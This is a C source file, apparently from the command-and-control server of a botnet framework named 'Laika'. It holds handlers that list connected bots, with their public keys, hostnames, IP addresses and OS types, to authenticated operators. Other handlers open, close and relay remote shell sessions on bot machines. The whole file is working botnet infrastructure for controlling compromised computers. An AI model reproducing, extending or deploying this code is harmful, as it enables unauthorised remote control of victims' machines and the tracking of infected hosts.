#include "cauth.h"

#include "cnc.h"
#include "core/lerror.h"
#include "core/lmem.h"
#include "cpeer.h"

void laikaC_sendPeerList(struct sLaika_cnc *cnc, struct sLaika_peer *authPeer)
{
    struct sLaika_peer *peer;
    size_t i = 0;

    /* send authPeer details on each peer that *isn't* itself */
    while (laikaC_iterPeersNext(cnc, &i, &peer)) {
        if (peer != authPeer) {
            LAIKA_DEBUG("sending peer info %p to auth %p)\n", peer, authPeer);
            laikaC_sendNewPeer(authPeer, peer);
        }
    }
}

void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
{
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_ADD_PEER_RES);

    /* write the peer's info */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_write(&authPeer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_write(&authPeer->sock, peer->inet, LAIKA_INET_LEN);
    laikaS_write(&authPeer->sock, peer->ipStr, LAIKA_IPSTR_LEN);
    laikaS_writeByte(&authPeer->sock, peer->type);
    laikaS_writeByte(&authPeer->sock, peer->osType);

    laikaS_endOutPacket(authPeer);
}

void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
{
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_RMV_PEER_RES);

    /* write the peer's pubkey */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_writeByte(&authPeer->sock, peer->type);

    laikaS_endOutPacket(authPeer);
}

/* ================================[[ [Auth] Packet Handlers ]]================================= */

void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
                                         void *uData)
{
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_peer *peer;
    uint16_t cols, rows;

    /* read pubkey & find peer */
    laikaS_read(&authPeer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
    if ((peer = laikaC_getPeerByPub(cnc, pubKey)) == NULL)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer doesn't exist!\n");

    if (peer->type != PEER_BOT)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");

    /* read term size */
    cols = laikaS_readu16(&authPeer->sock);
    rows = laikaS_readu16(&authPeer->sock);

    /* open shell */
    laikaC_openShell(peer, authPeer, cols, rows);
}

void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
                                          void *uData)
{
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    id = laikaS_readu32(&authPeer->sock);

    /* ignore malformed packet */
    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    laikaC_closeShell(shell);
}

void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
                                         void *uData)
{
    uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    struct sLaika_peer *peer;
    struct sLaika_shellInfo *shell;
    uint32_t id;

    if (sz - sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Wrong data size!\n");

    id = laikaS_readu32(&authPeer->sock);
    sz -= sizeof(uint32_t);

    /* ignore malformed packet */
    if (id >= LAIKA_MAX_SHELLS || (shell = pInfo->shells[id]) == NULL)
        return;

    peer = shell->bot;

    /* read data */
    laikaS_read(&authPeer->sock, data, sz);

    /* forward to peer */
    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
    laikaS_writeu32(&peer->sock, shell->botShellID);
    laikaS_write(&peer->sock, data, sz);
    laikaS_endVarPacket(peer);
}
